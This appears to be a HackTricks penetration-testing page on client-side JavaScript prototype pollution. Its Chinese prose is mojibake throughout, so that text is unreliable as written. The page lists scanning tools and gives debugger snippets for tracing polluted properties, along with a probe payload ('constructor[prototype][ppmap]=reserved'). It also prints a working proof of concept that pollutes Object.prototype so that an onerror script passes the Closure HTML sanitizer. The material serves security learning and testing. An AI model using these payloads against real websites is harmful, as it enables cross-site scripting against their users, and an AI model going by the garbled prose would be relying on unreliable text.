# å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä½¿ç”¨è‡ªåŠ¨å·¥å…·è¿›è¡Œå‘ç°

å·¥å…·[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**ï¼Œ**[**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **å’Œ**[**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find)å¯ç”¨äº**å‘ç°åŸå‹æ±¡æŸ“æ¼æ´**ã€‚

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨**æµè§ˆå™¨æ‰©å±•ç¨‹åº**[**PPScan**](https://github.com/msrkp/PPScan)æ¥**è‡ªåŠ¨** **æ‰«æ**æ‚¨**è®¿é—®**çš„**é¡µé¢**ï¼Œä»¥æŸ¥æ‰¾åŸå‹æ±¡æŸ“æ¼æ´ã€‚

### è°ƒè¯•å±æ€§ä½¿ç”¨ä½ç½® <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### å¯»æ‰¾åŸå‹æ±¡æŸ“çš„æ ¹æœ¬åŸå›  <a href="#id-5530" id="id-5530"></a>

ä¸€æ—¦ä»»ä½•å·¥å…·è¯†åˆ«å‡ºåŸå‹æ±¡æŸ“æ¼æ´ï¼Œå¹¶ä¸”å¦‚æœä»£ç ä¸æ˜¯è¿‡äºå¤æ‚ï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨ Chrome å¼€å‘è€…å·¥å…·ä¸­æœç´¢è¯¸å¦‚ `location.hash`ã€`decodeURIComponent` æˆ– `location.search` ç­‰å…³é”®å­—æ¥æ‰¾åˆ°æ¼æ´ã€‚è¿™ç§æ–¹æ³•å¯ä»¥å¸®åŠ©æ‚¨å‡†ç¡®å®šä½ JavaScript ä»£ç ä¸­çš„æ˜“å—æ”»å‡»éƒ¨åˆ†ã€‚

å¯¹äºæ›´å¤§æ›´å¤æ‚çš„ä»£ç åº“ï¼Œå‘ç°æ˜“å—æ”»å‡»ä»£ç çš„ç®€å•æ–¹æ³•åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1. ä½¿ç”¨å·¥å…·è¯†åˆ«æ¼æ´å¹¶è·å–ä¸€ä¸ªæ—¨åœ¨åœ¨æ„é€ å‡½æ•°ä¸­è®¾ç½®å±æ€§çš„æœ‰æ•ˆè½½è·ã€‚ppmap æä¾›çš„ä¸€ä¸ªç¤ºä¾‹å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š`constructor[prototype][ppmap]=reserved`ã€‚
2. åœ¨å°†åœ¨é¡µé¢ä¸Šæ‰§è¡Œçš„ç¬¬ä¸€è¡Œ JavaScript ä»£ç å¤„è®¾ç½®æ–­ç‚¹ã€‚ä½¿ç”¨æœ‰æ•ˆè½½è·åˆ·æ–°é¡µé¢ï¼Œä½¿æ‰§è¡Œåœ¨æ­¤æ–­ç‚¹å¤„æš‚åœã€‚
3. åœ¨ JavaScript æ‰§è¡Œæš‚åœæ—¶ï¼Œåœ¨ JS æ§åˆ¶å°ä¸­æ‰§è¡Œä»¥ä¸‹è„šæœ¬ã€‚æ­¤è„šæœ¬å°†åœ¨åˆ›å»º 'ppmap' å±æ€§æ—¶å‘å‡ºä¿¡å·ï¼Œæœ‰åŠ©äºå®šä½å…¶æ¥æºï¼š
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. å¯¼èˆªå›**Sources**é€‰é¡¹å¡ï¼Œé€‰æ‹©â€œæ¢å¤è„šæœ¬æ‰§è¡Œâ€ã€‚JavaScript å°†ç»§ç»­æ‰§è¡Œï¼Œå¹¶ä¸”'ppmap'å±æ€§å°†å¦‚é¢„æœŸèˆ¬è¢«æ±¡æŸ“ã€‚åˆ©ç”¨æä¾›çš„ä»£ç ç‰‡æ®µæœ‰åŠ©äºç¡®å®š'ppmap'å±æ€§è¢«æ±¡æŸ“çš„ç¡®åˆ‡ä½ç½®ã€‚é€šè¿‡æ£€æŸ¥**è°ƒç”¨å †æ ˆ**ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°å‘ç”Ÿæ±¡æŸ“çš„ä¸åŒå †æ ˆã€‚

åœ¨å†³å®šè¦è°ƒæŸ¥å“ªä¸ªå †æ ˆæ—¶ï¼Œé€šå¸¸æœ‰ç”¨çš„æ–¹æ³•æ˜¯é’ˆå¯¹ä¸ JavaScript åº“æ–‡ä»¶ç›¸å…³çš„å †æ ˆï¼Œå› ä¸ºåŸå‹æ±¡æŸ“ç»å¸¸å‘ç”Ÿåœ¨è¿™äº›åº“ä¸­ã€‚é€šè¿‡æ£€æŸ¥å…¶ä¸åº“æ–‡ä»¶çš„å…³è”æ¥è¯†åˆ«ç›¸å…³å †æ ˆï¼ˆåœ¨å³ä¾§å¯è§ï¼Œç±»ä¼¼äºæä¾›çš„æŒ‡å—å›¾åƒï¼‰ã€‚åœ¨å­˜åœ¨å¤šä¸ªå †æ ˆçš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚ç¬¬ 4 è¡Œå’Œç¬¬ 6 è¡Œï¼Œé€»è¾‘é€‰æ‹©æ˜¯ç¬¬ 4 è¡Œçš„å †æ ˆï¼Œå› ä¸ºå®ƒä»£è¡¨äº†æ±¡æŸ“çš„åˆå§‹å‘ç”Ÿï¼Œä»è€Œæ˜¯æ¼æ´çš„æ ¹æœ¬åŸå› ã€‚å•å‡»å †æ ˆå°†å¼•å¯¼æ‚¨åˆ°æ˜“å—æ”»å‡»çš„ä»£ç ã€‚

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## æŸ¥æ‰¾è„šæœ¬å°å·¥å…·

å°å·¥å…·æ˜¯**ä¸€æ—¦å‘ç° PP æ¼æ´å°†è¢«æ»¥ç”¨çš„ä»£ç **ã€‚

å¦‚æœåº”ç”¨ç¨‹åºå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥**æœç´¢**å…³é”®å­—ï¼Œå¦‚**`srcdoc/innerHTML/iframe/createElement`ï¼Œå¹¶æŸ¥çœ‹æºä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦**å¯¼è‡´ JavaScript æ‰§è¡Œ**ã€‚æœ‰æ—¶ï¼Œæåˆ°çš„æŠ€æœ¯å¯èƒ½æ ¹æœ¬æ‰¾ä¸åˆ°å°å·¥å…·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçº¯æºä»£ç å®¡æŸ¥ä¼šæ­ç¤ºä¸€äº›ä¸é”™çš„å°å·¥å…·ï¼Œå¦‚ä¸‹é¢çš„ç¤ºä¾‹ã€‚

### åœ¨ Mithil åº“ä»£ç ä¸­æŸ¥æ‰¾ PP å°å·¥å…·çš„ç¤ºä¾‹

æŸ¥çœ‹æ­¤æ–‡æ¡£ï¼š[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## é‡æ–°ç¼–è¯‘ç”¨äºæœ‰æ¼æ´åº“çš„æœ‰æ•ˆè½½è·

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## é€šè¿‡ PP ç»•è¿‡ HTML æ¶ˆæ¯’å™¨

[**è¿™é¡¹ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)å±•ç¤ºäº†å¯ç”¨äºé€šè¿‡æŸäº› HTML æ¶ˆæ¯’å™¨åº“æä¾›çš„**æ¶ˆæ¯’**çš„ PP å°å·¥å…·ï¼š

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒèµ„æ–™

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
